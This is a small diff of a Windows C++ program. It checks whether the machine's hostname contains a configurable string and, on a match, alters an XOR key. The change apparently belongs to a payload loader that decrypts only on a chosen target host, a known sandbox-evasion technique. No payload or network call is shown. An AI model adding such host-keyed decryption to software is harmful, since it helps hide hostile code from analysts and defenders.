@@ -248,8 +248,8 @@ int main()
     GetComputerNameA(name, &size);
 
     for (char character : name) strHostname.push_back(character);
-    if (strHostname.find("LEL") != std::string::npos) {
-        std::cout << "hit" << std::endl;
+    if (strHostname.find("CHANGESTRINGHERE") != std::string::npos) {
+        //std::cout << "hit" << std::endl;
         xorKey.replace(0, 1, "~");
     }
     
